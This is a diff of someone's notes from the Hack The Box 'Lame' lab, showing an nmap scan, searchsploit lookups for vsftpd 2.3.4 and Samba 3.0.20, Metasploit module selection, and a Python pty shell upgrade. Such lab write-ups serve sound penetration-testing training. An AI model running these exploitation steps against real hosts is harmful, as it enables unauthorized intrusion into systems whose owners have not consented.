@@ -1,4 +1,5 @@
-# nmap
+nmap
+```bash
 ┌──(root㉿kali)-[/home/tiger/htb_labs/lame]
 └─# nmap -sC -sV 10.10.10.3
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-29 22:32 CST
@@ -46,14 +47,15 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 85.23 seconds
+```
 
+exploit
+- important, we should read the description
+- https://www.exploit-db.com/exploits/17491
+- this backdoor was removed on july 3rd 2011.
 
-# exploit
-# !important, we should read the description
-# https://www.exploit-db.com/exploits/17491
-# this backdoor was removed on july 3rd 2011.
+```bash
 searchsploit vsftpd 2.3.4
-
 searchsploit samba 3.0.20
 msfconsole
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search samba 3.0.20
@@ -76,3 +78,4 @@ exploit
 
 # 开启一个pty
 python -c 'import pty;pty.spawn("/bin/bash")'
+```
